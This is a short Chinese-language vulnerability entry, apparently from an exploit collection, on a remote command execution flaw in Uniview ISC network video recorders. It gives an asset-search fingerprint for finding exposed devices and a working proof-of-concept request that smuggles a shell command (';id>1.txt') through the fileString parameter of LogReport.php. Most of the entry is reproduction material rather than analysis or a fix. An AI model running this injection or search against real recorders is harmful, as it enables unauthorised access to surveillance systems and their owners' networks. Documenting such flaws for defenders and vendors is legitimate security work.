# 浙江宇视科技 网络视频录像机 ISC LogReport.php 远程命令执行漏洞

## 漏洞描述

浙江宇视科技 网络视频录像机 ISC /Interface/LogReport/LogReport.php 页面，fileString 参数过滤不严格，导致攻击者可执行任意命令

## 漏洞影响

```
浙江宇视科技 网络视频录像机 ISC
```

## 网络测绘

```
app="uniview-ISC"
```

## 漏洞复现

登录页面

![image-20220519183432893](images/202205191834953.png)

验证POC

```
/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>1.txt
```

![image-20220519183528302](images/202205191835400.png)